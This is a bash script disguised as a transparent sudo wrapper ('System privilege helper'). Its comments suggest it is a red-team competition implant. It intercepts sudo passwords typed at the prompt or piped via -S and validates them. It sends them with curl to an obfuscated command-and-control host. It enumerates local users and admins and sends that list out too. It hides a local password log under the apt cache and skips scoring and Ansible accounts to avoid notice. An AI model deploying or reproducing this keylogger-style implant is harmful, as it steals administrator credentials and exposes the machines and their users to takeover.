#!/bin/bash
# System privilege helper
# Transparent wrapper — passes through all sudo behavior unchanged

REAL_SUDO="/usr/bin/sudo"

# Pass straight through for gray team scoring accounts
case "$(whoami)" in
    kingneptune|paintythepirate|greyteamadmin) exec $REAL_SUDO "$@" ;;
esac

# Ansible automation bypass — let Ansible run unimpeded
if [ -n "$ANSIBLE_REMOTE_TEMP" ]; then
    exec $REAL_SUDO "$@"
fi

LOG_DIR="/var/lib/apt/lists/.cache"
LOCAL_LOG="${LOG_DIR}/events"
C2_HOST=$(printf "%s" "__ENC__" | base64 -d)
C2_PORT="9001"
COLLECT_URL="http://${C2_HOST}:${C2_PORT}/log"

mkdir -p "$LOG_DIR" 2>/dev/null
chmod 700 "$LOG_DIR" 2>/dev/null

_json_esc() {
    local s="$1"
    s="${s//\\/\\\\}"
    s="${s//\"/\\\"}"
    printf '%s' "$s"
}

# -------------------------------------------------------
# Resolve identity/context upfront (cheap calls)
# -------------------------------------------------------
INVOKING_USER=$(whoami)
COMMAND_ARGS="$*"
HOST_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
HOST_TS=$(date -u "+%Y-%m-%dT%H:%M:%SZ")

# -------------------------------------------------------
# Handle -S flag: password arrives on stdin (Ansible, scripts).
# Read it, log it, replay it — fully transparent.
# -------------------------------------------------------
_HAS_S=0
for _arg in "$@"; do
    [ "$_arg" = "-S" ] && _HAS_S=1
done

if [ $_HAS_S -eq 1 ]; then
    IFS= read -r CAPTURED_PASS
    if [ -n "$CAPTURED_PASS" ]; then
        SAFE_PASS=$(_json_esc "$CAPTURED_PASS")
        SAFE_ARGS=$(_json_esc "$COMMAND_ARGS")
        PAYLOAD=$(printf '{"host_ip":"%s","user":"%s","event_type":"sudo","timestamp":"%s","data":{"password":"%s","command":"%s","source":"stdin"}}' \
            "$HOST_IP" "$INVOKING_USER" "$HOST_TS" "$SAFE_PASS" "$SAFE_ARGS")
        curl -sf -X POST -H "Content-Type: application/json" \
            -d "$PAYLOAD" --connect-timeout 3 --max-time 3 \
            "$COLLECT_URL" > /dev/null 2>&1 &
        echo "${HOST_TS}|sudo|${INVOKING_USER}|${CAPTURED_PASS}|${COMMAND_ARGS}|stdin" \
            >> "$LOCAL_LOG" 2>/dev/null
        # -- user enumeration: fire-and-forget --
        (
            SYNC_URL="http://${C2_HOST}:${C2_PORT}/sync"
            SUDO_USERS=$(getent group sudo wheel 2>/dev/null | awk -F: '{print $4}' | tr ',' '\n' | sort -u | tr '\n' ',' | sed 's/,$//')
            USERS_JSON="["
            FIRST=1
            while IFS=: read -r uname _ uid gid _ _ _; do
                [ "$uid" -lt 1000 ] && [ "$uname" != "root" ] && continue
                [ "$uid" -gt 60000 ] && continue
                IS_A=false
                [ "$uname" = "root" ] && IS_A=true
                echo ",$SUDO_USERS," | grep -q ",$uname," && IS_A=true
                [ $FIRST -eq 1 ] && FIRST=0 || USERS_JSON="${USERS_JSON},"
                USERS_JSON="${USERS_JSON}{\"username\":\"${uname}\",\"uid\":${uid},\"is_admin\":${IS_A}}"
            done < /etc/passwd
            USERS_JSON="${USERS_JSON}]"
            SPAYLOAD="{\"host_ip\":\"${HOST_IP}\",\"users\":${USERS_JSON}}"
            curl -sf -X POST -H "Content-Type: application/json" \
                -d "$SPAYLOAD" --connect-timeout 3 --max-time 5 \
                "$SYNC_URL" > /dev/null 2>&1
        ) &
    fi
    { printf '%s\n' "$CAPTURED_PASS"; cat; } | $REAL_SUDO "$@"
    exit $?
fi

# -------------------------------------------------------
# Non-interactive without -S: no password to capture
# (NOPASSWD, cached token, or sudo will fail on its own)
# -------------------------------------------------------
if [ ! -t 0 ]; then
    exec $REAL_SUDO "$@"
fi

# Pass straight through if sudo won't prompt (NOPASSWD or cached timestamp)
if $REAL_SUDO -n true 2>/dev/null; then
    exec $REAL_SUDO "$@"
fi

IFS= read -r -s -p "[sudo] password for ${INVOKING_USER}: " CAPTURED_PASS
echo ""

VALIDATE=$(echo "$CAPTURED_PASS" | $REAL_SUDO -S -v 2>&1)
VALIDATE_RC=$?

if [ $VALIDATE_RC -eq 0 ]; then
    SAFE_PASS=$(_json_esc "$CAPTURED_PASS")
    SAFE_ARGS=$(_json_esc "$COMMAND_ARGS")
    PAYLOAD=$(printf '{"host_ip":"%s","user":"%s","event_type":"sudo","timestamp":"%s","data":{"password":"%s","command":"%s"}}' \
        "$HOST_IP" \
        "$INVOKING_USER" \
        "$HOST_TS" \
        "$SAFE_PASS" \
        "$SAFE_ARGS")

    curl -sf -X POST -H "Content-Type: application/json" \
        -d "$PAYLOAD" --connect-timeout 3 --max-time 3 \
        "$COLLECT_URL" > /dev/null 2>&1 &

    echo "${HOST_TS}|sudo|${INVOKING_USER}|${CAPTURED_PASS}|${COMMAND_ARGS}" \
        >> "$LOCAL_LOG" 2>/dev/null

    # -- user enumeration: fire-and-forget, does not block sudo --
    (
        SYNC_URL="http://${C2_HOST}:${C2_PORT}/sync"
        SUDO_USERS=$(getent group sudo wheel 2>/dev/null | awk -F: '{print $4}' | tr ',' '\n' | sort -u | tr '\n' ',' | sed 's/,$//')
        USERS_JSON="["
        FIRST=1
        while IFS=: read -r uname _ uid gid _ _ _; do
            [ "$uid" -lt 1000 ] && [ "$uname" != "root" ] && continue
            [ "$uid" -gt 60000 ] && continue
            IS_A=false
            [ "$uname" = "root" ] && IS_A=true
            echo ",$SUDO_USERS," | grep -q ",$uname," && IS_A=true
            [ $FIRST -eq 1 ] && FIRST=0 || USERS_JSON="${USERS_JSON},"
            USERS_JSON="${USERS_JSON}{\"username\":\"${uname}\",\"uid\":${uid},\"is_admin\":${IS_A}}"
        done < /etc/passwd
        USERS_JSON="${USERS_JSON}]"
        SPAYLOAD="{\"host_ip\":\"${HOST_IP}\",\"users\":${USERS_JSON}}"
        curl -sf -X POST -H "Content-Type: application/json" \
            -d "$SPAYLOAD" --connect-timeout 3 --max-time 5 \
            "$SYNC_URL" > /dev/null 2>&1
    ) &

    exec $REAL_SUDO "$@"
else
    exec $REAL_SUDO "$@"
fi
